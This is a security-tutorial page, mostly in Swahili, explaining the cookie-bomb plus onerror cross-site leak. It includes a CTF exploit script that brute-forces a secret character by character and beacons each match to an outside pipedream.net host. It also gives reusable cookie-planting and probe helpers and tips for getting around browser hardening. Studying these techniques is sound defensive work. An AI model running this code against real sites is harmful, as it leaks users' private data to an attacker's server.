# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Mbinu hii inachanganya:
- Cookie bombing: kujaa browser ya mwathirika na cookies nyingi/ndefu kwa target origin ili maombi yanayofuata yafike mipaka ya server/maombi (request header size, URL size in redirects, n.k.).
- Error-event oracle: kujaribu endpoint ya cross-origin kwa `<script>` (au subresource nyingine) na kutofautisha hali kwa `onload` vs `onerror`.

Wazo la juu
- Tafuta target endpoint whose behavior differs for two states you want to test (mf., search “hit” vs “miss”).
- Hakikisha njia ya “hit” itasababisha mnyororo mkubwa wa redirects au URL ndefu ilhali njia ya “miss” inabaki fupi. Panda ukubwa wa request headers kwa kutumia cookies nyingi ili tu njia ya “hit” isababisha server kushindwa na HTTP error (mf., 431/414/400). Error inabadilisha onerror event na kuwa oracle kwa XS-Search.

Inafanya kazi lini
- Unaweza kusababisha browser ya mwathirika kutuma cookies kwa target (mf., cookies ni SameSite=None au unaweza kuzi-set katika context ya first-party kupitia popup `window.open`).
- Kuna kipengele cha app unachoweza kutumika vibaya kuweka cookies arbitrary (mf., “save preference” endpoints ambazo hubadilisha controlled input names/values kuwa Set-Cookie) au kufanya post-auth redirects zinazojumuisha data inayoendeshwa na mshambuliaji ndani ya URL.
- Server inajibu tofauti katika hali hizo mbili na, kwa headers/URL zilizopanuliwa, hali moja inapita kikomo na inarudisha response ya error ambayo inasababisha onerror.

Kumbuka kuhusu server errors zinazotumika kama oracle
- 431 Request Header Fields Too Large mara nyingi huarudishwa wakati cookies zinapopandwa na kueneza request headers; 414 URI Too Long au 400 maalum ya server yanaweza kurudishwa kwa targets za request ndefu. Moja ya hizi inasababisha subresource load kushindikana na kuwasha onerror. Angalia [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) kwa sababu za kawaida kama cookies nyingi kupita kiasi.

<details>
<summary>Mfano wa vitendo (angstromCTF 2022)</summary>

The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Kwa nini popup (`window.open`)?
- Vibrowse vya kisasa vinazuia third-party cookies zaidi na zaidi. Kufungua dirisha la top-level kwa target kunafanya cookies kuwa first‑party hivyo majibu ya Set-Cookie kutoka kwa target yataweza kushikamana, kuruhusu hatua ya cookie-bomb hata chini ya vikwazo vya third‑party cookie.

2024–2025 notes on cookie availability
- Utekelezaji wa Chrome’s Tracking Protection (Januari 2024) tayari unazuia third-party cookies kwa kundi la nasibu na umepangwa kupanuliwa kwa watumiaji wote mara UK CMA itakapokubali, hivyo chukulia kwamba mwathirika yeyote anaweza kupoteza 3P cookies ghafla. Automate the fallback: gundua wakati probe ya script yako inashindwa bila hata kugusa target na kwa uwazi pinda hadi mtiririko wa popup/first-party. Safari na Firefox tayari zinazuia nyingi za third-party cookies kwa default na CHIPS/partitioned cookies zina maana kila tovuti ya top-level sasa ina jar yake mwenyewe.
- Tumia mtiririko wa first‑party wa kupandikiza cookies (`window.open` + auto-submit kwenda kwa cookie-setting endpoint) kisha fanya probe kwa subresource inayofanikiwa tu wakati cookies hizo zinatumwa. Ikiwa third‑party cookies zimezuiwa, hamisha probe ndani ya muktadha wa same-site (mfano, endesha oracle katika popup kupitia gadget ya same-site na exfiltrate boolean kwa `postMessage` au beacon kwa server yako), au jisajili origin ya mwathirika katika Chrome’s deprecation trial ikiwa una udhibiti halali juu yake.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

Wakati unahitaji kufyeka cookies kadhaa kutoka muktadha wa cross-site, anzisha dirisha la muda la top-level na tuma mfululizo wa uwasilishaji wa fomu zenye ukubwa mkubwa kwa Set-Cookie endpoint dhaifu:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Iite mara tu kabla hujaanza probing ili kila oracle run ianze na cookie jar mpya iliyojaa.

</details>

Generic probing helper
Iwapo tayari una njia ya kuweka cookies nyingi kwenye target origin (first-party), unaweza kutumia tena minimal oracle hii dhidi ya endpoint yoyote ambayo success/failure yake husababisha matokeo tofauti ya mtandao (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Mbadala tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Kwa wataalamu: de Bruijn–based cookie packing (CTF-proven)
- Wakati app inakuwezesha kudhibiti cookie values kubwa, unaweza kupakia makisio kwa ufanisi kwa kuambatisha de Bruijn sequence kwenye kila probe. Hii inafanya per‑probe overhead kuwa ndogo huku ikihakikisha heavy branch inazidi kuwa nzito tu kwa prefix sahihi. Mfano wa generator kwa |Σ| symbols za urefu n (fits in a cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: set multiple cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

Vidokezo vya kujenga oracle
- Lazimishe hali ya “positive” kuwa nzito zaidi: unganisha redirect ya ziada tu wakati predicate iko kweli, au fanya redirect URL iakisi input isiyokuwa na mipaka ya mtumiaji ili ianze kukua pamoja na kiambishi awali kinachokadiriwa.
- Inflate headers: rudia cookie bombing mpaka kosa linalolingana lionewe kwenye njia “nzito”. Seva kawaida huweka kikomo kwa ukubwa wa header na zitatumbukia mapema zaidi wakati cookies nyingi ziko.
- Stabilize: anzisha shughuli nyingi za kuweka cookie kwa wakati mmoja na fanyia probe mara kwa mara ili kupunguza kelele za muda na caching kwa kutumia wastani.
- Bust caches and avoid pooling artifacts: ongeza `#fragment` ya nasibu au `?r=` kwa probe URLs, na upende majina tofauti ya window wakati unatumia `window.open` loops.
- Alternate subresources: ikiwa `<script>` inachujwa, jaribu `<link rel=stylesheet>` au `<img>`. The onload/onerror boolean ni oracle; maudhui hayahitaji kusomwa kamwe.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers huweka vizingiti tofauti. Kuanzia October 2025, Cloudflare inaandika 128 KB jumla kwa request headers (na 16 KB URL) kwenye edge, hivyo unaweza kuhitaji cookies zaidi/za ukubwa mkubwa wakati malengo yako yako nyuma yake. Stacks nyingine (mfano, Apache kupitia LimitRequestFieldSize) mara nyingi ziko karibu ~8 KB kwa mstari wa header na zitapata makosa mapema. Rekebisha ukubwa wa bomb ipasavyo (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) imeimarisha uhasibu wa load/error kwa script tag kwa rasilimali za cross-origin (CVE-2025-5266). Kwa wateja walio patched, ishara ya `onerror` kwa baadhi ya redirected responses imezuiwa, hivyo tofautisha oracle (parallel `<link rel=stylesheet>`, `<img>`, au `fetch` yenye MIME isiyolingana) na fingerprint UA ya mwathirika kabla ya kudhani boolean bado inafanya kazi.
- Tarajia builds za enterprise za Chromium zenye Tracking Protection au Fetch Metadata policies kuondoa cookies au kuandika upya redirects mara kwa mara. Gunduza matukio haya kwa kuchunguza endpoint fupi kwanza; inaposhindwa, badilika kiotomatiki kuendesha shambulio lote ndani ya popup na kusambaza biti kupitia `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) zinaweza kuunganishwa au kutumika badala yake unapoweza kulazimisha target ya request kuwa ndefu sana:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- Aina hii ya mashambulizi inajadiliwa kwa upana kama “Error Events” XS-Leaks. Hatua ya cookie-bomb ni njia rahisi ya kusukuma tawi moja pekee kuvuka vizingiti vya seva, ikitoa oracle ya boolean yenye uaminifu.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
